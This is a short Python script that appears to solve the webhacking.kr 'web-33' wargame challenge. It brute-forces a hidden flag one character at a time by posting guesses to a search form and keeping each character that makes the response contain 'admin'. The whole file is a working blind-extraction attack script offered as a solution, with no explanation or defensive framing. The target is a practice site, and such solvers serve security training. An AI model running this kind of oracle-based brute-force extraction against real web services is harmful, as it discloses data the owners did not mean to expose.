import requests
import string

url = "https://webhacking.kr/challenge/web-33/"
def solve():
    FLAG = "FLAG{"
    for i in range(1,45):
        for j in string.printable:
            if j == "%" or j == "?" or j == "&":
                continue
            payload = {'search':FLAG+j}
            res = requests.post(url,data=payload)
            print(payload)
            if 'admin' in res.text:
                FLAG += j
                print("FLAG : " + FLAG)
                break

if __name__ == "__main__":
    solve()